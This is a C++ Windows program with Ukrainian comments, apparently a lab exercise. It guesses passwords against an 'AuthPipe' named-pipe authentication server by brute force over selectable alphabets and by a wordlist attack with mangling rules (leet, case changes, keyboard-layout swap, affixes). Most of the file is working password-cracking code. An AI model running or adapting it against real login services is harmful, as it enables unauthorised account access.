#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <commdlg.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>
#include <chrono>
#include <limits>
#include <cstring>
#include <cctype>
#include <filesystem>
#include <clocale>

#include "PipeClient.h"

#pragma comment(lib, "Comdlg32.lib")

using namespace std;

const char PIPE_NAME_PREFIX[] = "\\\\";
const char PIPE_NAME_SUFFIX[] = "\\pipe\\AuthPipe";
const size_t FIELD_SIZE = 64;

struct AuthMessage
{
    char login[64];
    char password[64];
};

enum class AlphabetType
{
    Lowercase = 1,
    MixedAndDigits = 2,
    ExtendedBytes = 3
};

struct Rule
{
    string name;
    string argument;
};

// --- ШАБЛОННИЙ ОДНОНАПРАВЛЕНИЙ ЛІНІЙНИЙ СПИСОК (З глибоким копіюванням) ---
template <typename T>
struct Node
{
    T data;
    Node* next;
    Node(const T& val) : data(val), next(nullptr) {}
};

template <typename T>
class SinglyLinkedList
{
private:
    Node<T>* head;
    Node<T>* tail;
    size_t count;

public:
    SinglyLinkedList() : head(nullptr), tail(nullptr), count(0) {}

    // Конструктор копіювання (Глибоке копіювання для запобігання збоїв пам'яті)
    SinglyLinkedList(const SinglyLinkedList& other) : head(nullptr), tail(nullptr), count(0)
    {
        Node<T>* current = other.head;
        while (current)
        {
            PushBack(current->data);
            current = current->next;
        }
    }

    // Оператор присвоєння копіюванням
    SinglyLinkedList& operator=(const SinglyLinkedList& other)
    {
        if (this == &other)
        {
            return *this;
        }
        Clear();
        Node<T>* current = other.head;
        while (current)
        {
            PushBack(current->data);
            current = current->next;
        }
        return *this;
    }

    ~SinglyLinkedList()
    {
        Clear();
    }

    void PushBack(const T& val)
    {
        Node<T>* newNode = new Node<T>(val);
        if (!head)
        {
            head = tail = newNode;
        }
        else
        {
            tail->next = newNode;
            tail = newNode;
        }
        count++;
    }

    void Clear()
    {
        Node<T>* current = head;
        while (current)
        {
            Node<T>* nextNode = current->next;
            delete current;
            current = nextNode;
        }
        head = tail = nullptr;
        count = 0;
    }

    size_t Size() const { return count; }
    bool IsEmpty() const { return head == nullptr; }

    T* Back()
    {
        if (!tail) return nullptr;
        return &(tail->data);
    }

    class Iterator
    {
        Node<T>* current;
    public:
        Iterator(Node<T>* ptr) : current(ptr) {}
        bool operator!=(const Iterator& other) const { return current != other.current; }
        Iterator& operator++() { if (current) current = current->next; return *this; }
        T& operator*() { return current->data; }
        const T& operator*() const { return current->data; }
    };

    Iterator begin() const { return Iterator(head); }
    Iterator end() const { return Iterator(nullptr); }
};

struct RuleSet
{
    string fileName;
    SinglyLinkedList<string> words;
    SinglyLinkedList<Rule> rules;
};

// --- РЕАЛІЗАЦІЯ ПРАВИЛ У ВИГЛЯДІ МЕТОДІВ КЛАСУ ---
class RuleProcessor
{
public:
    static string Lower(const string& word, const string& arg)
    {
        string res = word;
        transform(res.begin(), res.end(), res.begin(),
            [](unsigned char character) { return static_cast<char>(tolower(character)); });
        return res;
    }

    static string Upper(const string& word, const string& arg)
    {
        string res = word;
        transform(res.begin(), res.end(), res.begin(),
            [](unsigned char character) { return static_cast<char>(toupper(character)); });
        return res;
    }

    static string Capitalize(const string& word, const string& arg)
    {
        string res = Lower(word, arg);
        if (!res.empty())
        {
            res[0] = static_cast<char>(toupper(static_cast<unsigned char>(res[0])));
        }
        return res;
    }

    static string Reverse(const string& word, const string& arg)
    {
        string res = word;
        reverse(res.begin(), res.end());
        return res;
    }

    static string Append(const string& word, const string& arg)
    {
        return word + arg;
    }

    static string Prepend(const string& word, const string& arg)
    {
        return arg + word;
    }

    static string Leet(const string& word, const string& arg)
    {
        string res = word;
        for (char& character : res)
        {
            switch (tolower(static_cast<unsigned char>(character)))
            {
            case 'a': character = '@'; break;
            case 'e': character = '3'; break;
            case 'i': character = '1'; break;
            case 'o': character = '0'; break;
            case 's': character = '$'; break;
            case 't': character = '7'; break;
            default: break;
            }
        }
        return res;
    }

    static string Layout(const string& word, const string& arg)
    {
        string res = word;
        const string latin = "qwertyuiop[]asdfghjkl;'zxcvbnm,./";
        const string cyrillic =
            "\xE9\xF6\xF3\xEA\xE5\xED\xE3\xF8\xF9\xE7\xF5\xA1"
            "\xF4\xB3\xE2\xE0\xEF\xF0\xEE\xEB\xE4\xE6\xB4"
            "\xFF\xF7\xF1\xEC\xE8\xF2\xFC\xE1\xFE\x2C\x2E";
        for (char& character : res)
        {
            size_t position = latin.find(static_cast<char>(tolower(static_cast<unsigned char>(character))));
            if (position != string::npos && position < cyrillic.size())
            {
                character = cyrillic[position];
            }
        }
        return res;
    }

    static string Apply(const string& word, const string& ruleName, const string& arg)
    {
        if (ruleName == "LOWER") return Lower(word, arg);
        if (ruleName == "UPPER") return Upper(word, arg);
        if (ruleName == "CAPITALIZE") return Capitalize(word, arg);
        if (ruleName == "REVERSE") return Reverse(word, arg);
        if (ruleName == "APPEND") return Append(word, arg);
        if (ruleName == "PREPEND") return Prepend(word, arg);
        if (ruleName == "LEET") return Leet(word, arg);
        if (ruleName == "LAYOUT") return Layout(word, arg);
        return word;
    }
};

void PrintError(const string& message, DWORD errorCode = GetLastError())
{
    cout << message << " Код помилки Windows: " << errorCode << endl;
}

string ReadLine(const string& prompt)
{
    string value;
    cout << prompt;
    getline(cin, value);
    return value;
}

int ReadInteger(const string& prompt, int minimum, int maximum)
{
    while (true)
    {
        string text = ReadLine(prompt);
        try
        {
            size_t used = 0;
            int value = stoi(text, &used);
            if (used == text.size() && value >= minimum && value <= maximum)
            {
                return value;
            }
        }
        catch (...)
        {
        }
        cout << "Введіть ціле число від " << minimum << " до " << maximum << "." << endl;
    }
}

bool SelectTextFile(string& selectedFile, const char* title)
{
    char fileName[MAX_PATH] = {};
    OPENFILENAMEA dialog = {};
    dialog.lStructSize = sizeof(dialog);
    dialog.hwndOwner = NULL;
    dialog.lpstrFile = fileName;
    dialog.nMaxFile = MAX_PATH;
    dialog.lpstrFilter = "Текстові файли (*.txt)\0*.txt\0Усі файли (*.*)\0*.*\0";
    dialog.nFilterIndex = 1;
    dialog.lpstrTitle = title;
    dialog.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_NOCHANGEDIR;

    if (GetOpenFileNameA(&dialog) == FALSE)
    {
        cout << "Файл не вибрано." << endl;
        return false;
    }

    selectedFile = fileName;
    return true;
}

string BuildPipeName(const string& serverName)
{
    return string(PIPE_NAME_PREFIX) + serverName + PIPE_NAME_SUFFIX;
}

bool Authenticate(const string& serverName, const string& login, const string& password, bool waitIfBusy = true)
{
    if (login.empty() || password.empty())
    {
        cout << "Логін і пароль не повинні бути порожніми." << endl;
        return false;
    }

    if (login.size() >= FIELD_SIZE || password.size() >= FIELD_SIZE)
    {
        cout << "Логін або пароль занадто довгий. Максимум — 63 байти." << endl;
        return false;
    }

    string pipeName = BuildPipeName(serverName);
    CPipeClient<AuthMessage> pipe;

    if (!pipe.ConnectPipe(const_cast<char*>(pipeName.c_str()), waitIfBusy))
    {
        PrintError("Не вдалося під'єднатися до сервера. Перевірте, чи запущено сервер і чи правильне його ім'я.");
        return false;
    }

    AuthMessage message = {};
    strcpy_s(message.login, sizeof(message.login), login.c_str());
    strcpy_s(message.password, sizeof(message.password), password.c_str());

    if (!pipe.WriteMessage(message))
    {
        PrintError("Не вдалося надіслати логін і пароль.");
        return false;
    }

    char response = '0';
    if (!pipe.ReadResponse(response))
    {
        PrintError("Не вдалося отримати відповідь сервера.");
        return false;
    }

    return response == '1';
}

string GetAlphabet(int alphabetNumber)
{
    if (alphabetNumber == 1)
    {
        return "abcdefghijklmnopqrstuvwxyz'";
    }

    if (alphabetNumber == 2)
    {
        return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'0123456789";
    }

    string alphabet;
    for (int value = 1; value <= 127; value++)
    {
        alphabet.push_back(static_cast<char>(value));
    }
    return alphabet;
}

bool TryPassword(const string& serverName, const string& login, const string& password)
{
    return Authenticate(serverName, login, password);
}

bool BruteForce(const string& serverName, const string& login, int alphabetNumber, int maximumLength)
{
    string alphabet = GetAlphabet(alphabetNumber);
    string password;
    unsigned long long attempts = 0;
    auto startTime = chrono::steady_clock::now();

    cout << "\nАтака повним перебором. Довжина від 1 до " << maximumLength << "." << endl;
    cout << "Кількість символів: " << alphabet.size() << "." << endl;

    for (int length = 1; length <= maximumLength; length++)
    {
        vector<size_t> indexes(static_cast<size_t>(length), 0);
        bool finishedLength = false;

        while (!finishedLength)
        {
            password.clear();
            for (size_t index : indexes)
            {
                password.push_back(alphabet[index]);
            }

            attempts++;
            if (TryPassword(serverName, login, password))
            {
                auto endTime = chrono::steady_clock::now();
                double seconds = chrono::duration<double>(endTime - startTime).count();

                cout << "\nПароль знайдено: " << password << endl;
                cout << "Логін: " << login << endl;
                cout << "Максимальна довжина: " << maximumLength << endl;
                cout << "Тип алфавіту: " << alphabetNumber << endl;
                cout << "Кількість спроб: " << attempts << endl;
                cout << "Час пошуку: " << seconds << " с." << endl;
                return true;
            }

            int position = length - 1;
            while (position >= 0)
            {
                indexes[static_cast<size_t>(position)]++;
                if (indexes[static_cast<size_t>(position)] < alphabet.size())
                {
                    break;
                }

                indexes[static_cast<size_t>(position)] = 0;
                position--;
            }

            if (position < 0)
            {
                finishedLength = true;
            }
        }

        cout << "Перебір для довжини " << length << " завершено." << endl;
    }

    auto endTime = chrono::steady_clock::now();
    double seconds = chrono::duration<double>(endTime - startTime).count();
    cout << "\nПароль не знайдено." << endl;
    cout << "Кількість спроб: " << attempts << endl;
    cout << "Час пошуку: " << seconds << " с." << endl;
    return false;
}

bool LoadRuleScript(const string& scriptPath, SinglyLinkedList<RuleSet>& allRuleSets)
{
    ifstream script(scriptPath);
    if (!script.is_open())
    {
        cout << "Не вдалося відкрити файл сценарію правил: " << scriptPath << endl;
        return false;
    }

    string line;
    filesystem::path scriptFolder = filesystem::path(scriptPath).parent_path();

    while (getline(script, line))
    {
        if (line.empty() || line[0] == '#')
        {
            continue;
        }

        size_t separator = line.find(' ');
        string command = (separator == string::npos) ? line : line.substr(0, separator);
        string argument = (separator == string::npos) ? "" : line.substr(separator + 1);

        if (command == "WORDLIST")
        {
            RuleSet newSet;
            newSet.fileName = argument;

            filesystem::path wordPath = filesystem::path(argument);
            if (wordPath.is_relative())
            {
                wordPath = scriptFolder / wordPath;
            }

            ifstream wordsFile(wordPath);
            if (!wordsFile.is_open())
            {
                cout << "Не вдалося відкрити файл зі списком слів: " << wordPath.string() << endl;
                return false;
            }

            string word;
            while (getline(wordsFile, word))
            {
                if (!word.empty())
                {
                    newSet.words.PushBack(word);
                }
            }

            allRuleSets.PushBack(newSet);
        }
        else if (command == "LOWER" || command == "UPPER" ||
            command == "CAPITALIZE" || command == "REVERSE" ||
            command == "LEET" || command == "LAYOUT" ||
            command == "APPEND" || command == "PREPEND")
        {
            RuleSet* lastSet = allRuleSets.Back();
            if (!lastSet)
            {
                RuleSet defaultSet;
                defaultSet.fileName = "default";
                allRuleSets.PushBack(defaultSet);
                lastSet = allRuleSets.Back();
            }
            lastSet->rules.PushBack({ command, argument });
        }
        else
        {
            cout << "Невідома команда у сценарії: " << command << endl;
            return false;
        }
    }

    bool hasWords = false;
    for (const auto& set : allRuleSets)
    {
        if (!set.words.IsEmpty())
        {
            hasWords = true;
            break;
        }
    }

    if (!hasWords)
    {
        cout << "У сценарії не вказано список слів. Додайте WORDLIST назва_файлу.txt." << endl;
        return false;
    }

    return true;
}

bool RuleAttack(const string& serverName, const string& login)
{
    string scriptPath;
    if (!SelectTextFile(scriptPath, "Виберіть файл сценарію правил"))
    {
        return false;
    }

    SinglyLinkedList<RuleSet> allRuleSets;
    if (!LoadRuleScript(scriptPath, allRuleSets))
    {
        return false;
    }

    vector<string> candidates;
    size_t totalWordsCount = 0;

    for (const RuleSet& ruleSet : allRuleSets)
    {
        for (const string& word : ruleSet.words)
        {
            totalWordsCount++;
            candidates.push_back(word);

            for (const Rule& rule : ruleSet.rules)
            {
                string candidate = RuleProcessor::Apply(word, rule.name, rule.argument);
                if (!candidate.empty() && candidate.size() < FIELD_SIZE)
                {
                    candidates.push_back(candidate);
                }
            }
        }
    }

    sort(candidates.begin(), candidates.end());
    candidates.erase(unique(candidates.begin(), candidates.end()), candidates.end());

    cout << "Завантажено базових слів: " << totalWordsCount << endl;
    cout << "Унікальних кандидатів: " << candidates.size() << endl;

    auto startTime = chrono::steady_clock::now();
    unsigned long long attempts = 0;

    for (const string& candidate : candidates)
    {
        if (candidate.empty() || candidate.size() >= FIELD_SIZE)
        {
            continue;
        }

        attempts++;
        if (TryPassword(serverName, login, candidate))
        {
            auto endTime = chrono::steady_clock::now();
            double seconds = chrono::duration<double>(endTime - startTime).count();
            cout << "\nПароль знайдено: " << candidate << endl;
            cout << "Логін: " << login << endl;
            cout << "Кількість спроб: " << attempts << endl;
            cout << "Час пошуку: " << seconds << " с." << endl;
            return true;
        }
    }

    auto endTime = chrono::steady_clock::now();
    double seconds = chrono::duration<double>(endTime - startTime).count();
    cout << "\nПароль не знайдено за допомогою правил." << endl;
    cout << "Кількість спроб: " << attempts << endl;
    cout << "Час пошуку: " << seconds << " с." << endl;
    return false;
}

int main()
{
    SetConsoleCP(CP_UTF8);
    SetConsoleOutputCP(CP_UTF8);
    setlocale(LC_ALL, ".UTF8");

    cout << "==============================================" << endl;
    cout << "Програма підбору пароля" << endl;
    cout << "Зв'язок із сервером здійснюється через канал AuthPipe" << endl;
    cout << "==============================================" << endl;

    string serverName = ReadLine("Ім'я сервера (крапка . для цього комп'ютера): ");
    if (serverName.empty())
    {
        serverName = ".";
    }

    cout << "\nОберіть операцію:" << endl;
    cout << "1 - Перевірити конкретну пару логін/пароль" << endl;
    cout << "2 - Атака пароля" << endl;

    int action = ReadInteger("Ваш вибір: ", 1, 2);

    if (action == 1)
    {
        string login = ReadLine("Введіть логін: ");
        string password = ReadLine("Введіть пароль: ");

        if (Authenticate(serverName, login, password))
        {
            cout << "Сервер підтвердив правильність логіна й пароля." << endl;
        }
        else
        {
            cout << "Сервер відхилив пару логін/пароль або сталася помилка з'єднання." << endl;
        }
    }
    else
    {
        string login = ReadLine("Введіть логін, для якого потрібно підібрати пароль: ");

        cout << "\nОберіть спосіб атаки:" << endl;
        cout << "1 - Повний перебір" << endl;
        cout << "2 - Атака за словником і правилами" << endl;
        int attackType = ReadInteger("Ваш вибір: ", 1, 2);

        if (attackType == 1)
        {
            cout << "\nТип алфавіту:" << endl;
            cout << "1 - Лише малі латинські літери та апостроф (27 символів)" << endl;
            cout << "2 - Малі й великі латинські літери, цифри та апостроф (63 символи)" << endl;
            cout << "3 - Розширений набір байтів без нульового байта (127 символів)" << endl;
            int alphabetNumber = ReadInteger("Ваш вибір: ", 1, 3);
            int maximumLength = ReadInteger("Максимальна довжина пароля (1-20): ", 1, 20);
            BruteForce(serverName, login, alphabetNumber, maximumLength);
        }
        else
        {
            RuleAttack(serverName, login);
        }
    }

    cout << "\nНатисніть Enter, щоб завершити роботу.";
    string unused;
    getline(cin, unused);
    return 0;
}